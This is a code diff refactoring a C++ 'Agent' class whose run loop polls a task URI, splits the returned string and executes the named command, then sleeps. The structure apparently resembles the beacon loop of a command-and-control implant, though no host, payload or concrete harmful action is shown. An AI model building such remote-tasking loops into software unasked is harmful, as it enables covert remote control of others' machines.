@@ -2,26 +2,22 @@
 
 
 // @TODO add dependancy injection with IoC container.
-Agent::Agent() {
+Agent::Agent(Request req, Command cmd) : hRequest{ req }, hCommand{ cmd } {}
 
-}
-
-void Agent::Register() const {
+void Agent::Register() {
 
 
 }
 
 
-void Agent::run() const{
+void Agent::run() {
 	Register();
 
 	std::vector<std::string> task = util::split("");
 
-
 	while (true) {
-		std::string task = Request.Get(TASK_URI);
-		Ping();
-
+		std::string task = hRequest.Get(TASK_URI);
+		
 		if (task != "") {
 			std::vector <std::string> Task = util::split(task);
 			std::vector <std::string> args;
@@ -29,11 +25,11 @@ void Agent::run() const{
 
 			std::string Cmd = Task[0];
 
-			if (cmdHandler.HasCommand(Cmd)) {
-				cmdHandler.ExecuteCommand(Cmd, args);
+			if (hCommand.HasCommand(Cmd)) {
+				hCommand.ExecuteCommand(Cmd, args);
 			}
 		}
 
 		Sleep(SLEEP_TIME);
-
+	}
 }
